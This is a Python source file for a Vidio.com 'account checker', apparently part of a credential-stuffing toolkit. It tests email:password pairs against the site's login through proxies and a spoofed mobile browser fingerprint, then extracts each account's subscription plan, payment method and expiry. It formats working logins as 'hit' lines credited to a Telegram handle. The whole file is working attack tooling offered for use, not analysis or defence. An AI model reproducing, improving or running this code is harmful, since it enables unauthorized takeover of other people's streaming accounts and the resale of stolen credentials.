class VidioChecker:
    """Vidio.com account checker (sync, embedded)."""
    def __init__(self, proxy=None, timeout=25):
        self.proxy = proxy
        self.timeout = timeout or 25

    def check(self, email, password, proxy=None):
        proxy = proxy or self.proxy
        try:
            session = _curl_session("chrome131_android")
        except Exception:
            session = requests.Session()
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}
        H = {
            "accept-language": "en-IN,en-GB;q=0.9,en;q=0.7",
            "user-agent": _VIDIO_UA,
            "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
        }
        # CSRF
        csrf = None
        try:
            r = session.get(
                _VIDIO_LOGIN_PAGE,
                headers={**H, "accept": "text/html", "sec-fetch-dest": "document"},
                timeout=self.timeout,
            )
            text = r.text or ""
            m = re.search(r'name="csrf-token"\s+content="([^"]+)"', text)
            if not m:
                m = re.search(r'name="authenticity_token"\s+value="([^"]+)"', text)
            if m:
                csrf = m.group(1)
        except Exception as e:
            return {"status": "error", "message": f"csrf_net: {str(e)[:50]}"}
        # Login
        try:
            body = {
                "user[login]": email,
                "user[password]": password,
            }
            if csrf:
                body["authenticity_token"] = csrf
            r = session.post(
                _VIDIO_LOGIN_URL,
                data=body,
                headers={
                    **H,
                    "content-type": "application/x-www-form-urlencoded",
                    "origin": _VIDIO_BASE_WEB,
                    "referer": _VIDIO_LOGIN_PAGE,
                    "x-requested-with": "XMLHttpRequest",
                },
                timeout=self.timeout,
                allow_redirects=True,
            )
        except Exception as e:
            return {"status": "error", "message": f"login_net: {str(e)[:50]}"}
        low = (r.text or "").lower()
        if r.status_code == 401 or any(k in low for k in _VIDIO_BAD):
            return {"status": "bad", "message": "Invalid credentials"}
        # tokens from cookies
        cookies = {}
        try:
            cookies = dict(session.cookies)
        except Exception:
            pass
        api_headers = {
            **H,
            "accept": "application/json",
            "api-key": _VIDIO_API_KEY,
            "x-api-key": _VIDIO_API_KEY,
        }
        for k, v in list(cookies.items()):
            if "token" in k.lower() or k.lower() in ("access_token", "x_user_token"):
                api_headers["Authorization"] = f"Bearer {v}"
                api_headers["x-user-token"] = v
        # user data
        uid = "N/A"
        plenty_id = "N/A"
        try:
            dr = session.get(_VIDIO_DATA_URL, headers=api_headers, timeout=self.timeout)
            if dr.status_code == 200:
                dj = dr.json() if dr.text else {}
                u = dj.get("data") or dj.get("user") or dj
                if isinstance(u, dict):
                    attrs = u.get("attributes") or u
                    uid = attrs.get("id") or u.get("id") or uid
                    plenty_id = attrs.get("plenty_id") or attrs.get("plentyId") or plenty_id
        except Exception:
            pass
        # subscriptions
        plan = "N/A"
        plan_type = "N/A"
        plan_status = "N/A"
        price = "N/A"
        started = "N/A"
        expires = "N/A"
        days_left = 0
        auto_renew = "N/A"
        payment = "N/A"
        product = "N/A"
        included = ""
        sub_count = 0
        try:
            sr = session.get(_VIDIO_SUBS_URL, headers=api_headers, timeout=self.timeout)
            if sr.status_code == 200:
                sj = sr.json() if sr.text else {}
                data_list = sj.get("data") or []
                if isinstance(data_list, list):
                    sub_count = len(data_list)
                    if data_list:
                        sub = data_list[0] if isinstance(data_list[0], dict) else {}
                        sattrs = sub.get("attributes") or sub
                        plan = sattrs.get("product_name") or sattrs.get("name") or "Premium"
                        plan_type = sattrs.get("product_type") or sattrs.get("type") or "N/A"
                        plan_status = sattrs.get("status") or "N/A"
                        started = sattrs.get("started_at") or sattrs.get("created_at") or "N/A"
                        expires = sattrs.get("expires_at") or sattrs.get("end_at") or "N/A"
                        auto_renew = "Yes" if sattrs.get("auto_renew") else "No"
                        payment = sattrs.get("payment_method") or sattrs.get("payment") or "N/A"
                        product = sattrs.get("product_id") or "N/A"
                        pr = sattrs.get("price") or sattrs.get("amount")
                        if isinstance(pr, dict):
                            price = f"{pr.get('amount', '?')} {pr.get('currency', 'IDR')}"
                        elif pr is not None:
                            price = str(pr)
                        try:
                            if expires and expires not in ("N/A", "-"):
                                dt = datetime.fromisoformat(str(expires).replace("Z", "+00:00")).replace(tzinfo=None)
                                days_left = max((dt - datetime.utcnow()).days, 0)
                        except Exception:
                            pass
                inc = sj.get("included") or []
                if isinstance(inc, list):
                    names = []
                    for i in inc:
                        if isinstance(i, dict):
                            ia = i.get("attributes") or i
                            n = ia.get("name") or ia.get("title") or ""
                            if n:
                                names.append(n)
                    included = " | ".join(names)[:200]
        except Exception:
            pass
        # auto logout
        try:
            session.post(_VIDIO_LOGOUT_URL, headers=api_headers, timeout=8)
        except Exception:
            pass

        if sub_count > 0 and plan not in ("N/A", ""):
            status = "premium"
            msg = f"Plan: {plan} | Days: {days_left}"
        elif cookies or uid not in ("N/A", "", None):
            status = "free"
            msg = "Valid login, no active sub"
        else:
            # might still be bad if no session
            if any(k in low for k in _VIDIO_BAD):
                status = "bad"
                msg = "Invalid credentials"
            else:
                status = "free"
                msg = "Login ok / free"

        zip_line = (
            f"{email}:{password} | Plan = {plan} | PlanType = {plan_type} | Status = {plan_status} | "
            f"Price = {price} | Started = {started} | Expires = {expires} | DaysLeft = {days_left} | "
            f"AutoRenew = {auto_renew} | Payment = {payment} | Product = {product} | "
            f"PlentyID = {plenty_id} | UID = {uid} | Included = {included} | by TG: @samviir"
        )
        return {
            "status": status,
            "message": msg,
            "plan": plan,
            "country": "",
            "email": email,
            "password": password,
            "zip_line": zip_line,
            "hit_text": zip_line,
            "hit_line": zip_line,
        }



